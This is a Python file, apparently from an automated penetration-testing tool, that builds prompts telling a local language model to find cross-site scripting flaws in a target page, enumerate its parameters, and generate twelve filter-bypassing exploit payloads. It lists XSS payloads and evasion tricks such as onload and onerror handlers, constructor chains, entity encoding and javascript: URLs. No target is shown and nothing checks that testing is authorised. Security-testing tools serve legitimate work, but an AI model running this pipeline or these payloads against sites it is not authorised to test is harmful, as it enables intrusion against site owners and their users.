#task_master.py
from ai_core import ask_ollama
import json
def analyze_target_for_vulnerabilities(url, html_content, js_content_map):
    if not html_content and not js_content_map:
        return None
    js_summary = ""
    for filename, content in js_content_map.items():
        js_summary += f"\n=== {filename} ===\n{content[:3000]}\n"
    prompt = f"""You are a senior web application security researcher with 15+ years of experience finding XSS vulnerabilities. Your expertise includes DOM-based XSS, reflected XSS, and advanced filter bypass techniques.

ANALYSIS TARGET:
URL: {url}
HTML SOURCE CODE:
{html_content[:5000]}

JAVASCRIPT FILES:
{js_summary}

ANALYSIS METHODOLOGY:
Follow this systematic approach to identify XSS vulnerabilities:

1. IDENTIFY DATA SOURCES (where user input enters):
   - URLSearchParams.get('param_name')
   - location.search, location.hash, location.href
   - document.cookie parsing
   - postMessage event data
   - WebSocket message data
   - localStorage/sessionStorage retrieval
   - Form input values accessed via JavaScript

2. TRACE DATA FLOW:
   - Follow how user data moves through variables
   - Identify any sanitization or filtering applied
   - Note transformations or encoding/decoding operations

3. IDENTIFY DANGEROUS SINKS (where code execution happens):
   - innerHTML, outerHTML assignments
   - document.write, document.writeln calls
   - eval(), Function(), setTimeout/setInterval with string parameters
   - script.src, iframe.src assignments
   - location.href assignments with javascript: protocol
   - setAttribute with event handlers or javascript: URLs
   - insertAdjacentHTML calls

4. VULNERABILITY ASSESSMENT:
   - Determine if user input reaches sinks without proper sanitization
   - Assess exploitability based on context and filters

EXAMPLE ANALYSIS:
```javascript
// VULNERABLE CODE EXAMPLE:
const urlParams = new URLSearchParams(window.location.search);
const callback = urlParams.get('callback');  // SOURCE: URL parameter
setTimeout(callback + '()', 2000);  // SINK: Code execution
```
This shows callback parameter flows directly to setTimeout execution context.

ANALYSIS OUTPUT REQUIREMENTS:
- Provide EXACT parameter names found in the code
- Quote the EXACT source code that retrieves parameters
- Quote the EXACT sink code that uses the parameter
- Explain the vulnerability with technical precision

Respond with valid JSON:
{{
    "analysis_summary": "Technical summary of security posture and findings",
    "discovered_targets": [
        {{
            "parameter": "exact_parameter_name_from_code",
            "type": "DOM-Based XSS|Reflected XSS|Stored XSS",
            "source_code": "exact JavaScript line that gets the parameter",
            "sink_code": "exact JavaScript line that uses it dangerously",
            "description": "precise technical explanation of data flow vulnerability",
            "confidence": 0.9,
            "vulnerability_class": "Cross-Site Scripting",
            "attack_complexity": "Low",
            "filtering_detected": "description of any input validation found"
        }}
    ]
}}"""
    return ask_ollama(prompt)
def generate_exploits_for_target(target_info):
    if not target_info:
        return None
    vuln_type = target_info.get('type', 'XSS')
    parameter = target_info.get('parameter', 'unknown')
    sink_code = target_info.get('sink_code', '')
    source_code = target_info.get('source_code', '')
    description = target_info.get('description', '')
    filtering = target_info.get('filtering_detected', 'none')
    prompt = f"""You are an elite penetration tester specializing in XSS exploit development and filter bypass techniques. You have successfully bypassed security controls at major corporations and understand advanced evasion methods.

VULNERABILITY DETAILS:
Type: {vuln_type}
Parameter: {parameter}
Source Code: {source_code}
Sink Code: {sink_code}
Description: {description}
Detected Filtering: {filtering}

EXPLOIT DEVELOPMENT METHODOLOGY:

1. CONTEXT ANALYSIS:
   Analyze the sink context to understand execution environment:
   - If innerHTML: HTML context, tags and attributes work
   - If setTimeout/eval: JavaScript execution context
   - If document.write: Direct HTML injection
   - If attribute assignment: Attribute context

2. FILTER ANALYSIS:
   Based on the filtering detected, identify bypass strategies:
   - Script tag filters: Use event handlers, javascript: protocol
   - Event handler filters: Use alternative tags, encoding
   - Keyword filters: Use encoding, case variation, fragmentation
   - Character filters: Use HTML entities, Unicode variants

3. PAYLOAD CRAFTING PRINCIPLES:
   - Match payload to execution context
   - Use minimal syntax for maximum compatibility
   - Employ multiple bypass techniques simultaneously
   - Test boundary conditions and edge cases

ADVANCED BYPASS TECHNIQUES:

HTML Context Bypasses:
- <svg onload=alert(1)>
- <img src=x onerror=alert(1)>
- <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;">
- <object data="javascript:alert(1)">

JavaScript Context Bypasses:
- alert`1` (template literals)
- (alert)(1) (function wrapping)
- [].constructor.constructor('alert(1)')() (constructor chain)
- top['ale'+'rt'](1) (string concatenation)

Encoding Bypasses:
- &#97;lert(1) (decimal entities)
- &amp;#x61;lert(1) (hex entities)
- String.fromCharCode(97,108,101,114,116) (character codes)
- unescape('%61%6c%65%72%74') (URL encoding)

Protocol Bypasses:
- javascript:alert(1)
- JaVaScRiPt:alert(1) (case variation)
- java&#115;cript:alert(1) (entity encoding)
- data:text/html,<script>alert(1)</script>

Generate 12 sophisticated payloads specifically designed for this vulnerability:

Respond with valid JSON:
{{
    "exploit_analysis": "Technical analysis of the vulnerability and recommended attack approach based on sink context",
    "bypass_strategy": "Specific strategy for bypassing detected filters",
    "payloads": [
        {{
            "payload": "crafted_exploit_payload",
            "technique": "specific_bypass_method_used",
            "explanation": "technical explanation of why this payload works for this specific sink and bypasses detected filters",
            "confidence": 0.85,
            "execution_context": "where and how this payload executes",
            "filter_bypass": "which filters this specifically defeats"
        }}
    ]
}}"""
    return ask_ollama(prompt)
def advanced_parameter_discovery(url, html_content):
    prompt = f"""You are a web application reconnaissance expert with deep knowledge of parameter extraction techniques used by modern web applications.

TARGET ANALYSIS:
URL: {url}
HTML SOURCE:
{html_content[:4000]}

COMPREHENSIVE PARAMETER DISCOVERY METHODOLOGY:

1. FORM ANALYSIS:
   Extract all form elements and their input parameters:
   - input[name], input[id] attributes
   - textarea[name] attributes  
   - select[name] attributes
   - Hidden input fields
   - Form action URLs with embedded parameters

2. JAVASCRIPT PARAMETER EXTRACTION:
   Identify all methods used to extract URL parameters:
   - URLSearchParams.get('param')
   - location.search parsing
   - location.hash parsing
   - Custom getUrlParam() functions
   - Regular expression parameter extraction
   - Query string splitting and parsing

3. URL STRUCTURE ANALYSIS:
   - Current URL query parameters
   - Hash fragment parameters
   - Path parameters in REST-style URLs

4. DATA ATTRIBUTE INSPECTION:
   - data-* attributes that might be processed by JavaScript
   - Custom attributes used for parameter passing

5. AJAX ENDPOINT DISCOVERY:
   - XMLHttpRequest parameter usage
   - Fetch API parameter usage
   - jQuery parameter passing

6. ADVANCED PARAMETER SOURCES:
   - PostMessage parameter handling
   - WebSocket parameter processing
   - LocalStorage/SessionStorage key usage
   - Cookie value parsing for parameters

EXAMPLE PARAMETER PATTERNS:
```javascript
// Common patterns to identify:
new URLSearchParams(location.search).get('callback')  // callback parameter
location.hash.substring(1)  // hash parameters
document.cookie.match(/token=([^;]*)/)[1]  // cookie parameters
```

Analyze the provided HTML and extract ALL possible input parameters using this methodology.

Respond with valid JSON:
{{
    "analysis_summary": "Overview of parameter discovery findings and methodology used",
    "discovered_parameters": ["complete_list_of_all_found_parameters"],
    "form_parameters": ["parameters_from_html_forms"],
    "javascript_parameters": ["parameters_extracted_via_javascript"],
    "url_parameters": ["parameters_from_current_url"],
    "ajax_parameters": ["parameters_used_in_ajax_calls"],
    "custom_parameters": ["parameters_from_custom_parsing_functions"],
    "parameter_details": [
        {{
            "parameter": "parameter_name",
            "extraction_method": "how this parameter is extracted",
            "usage_context": "where/how this parameter is used",
            "potential_vulnerability": "assessment of XSS potential"
        }}
    ]
}}"""
    return ask_ollama(prompt)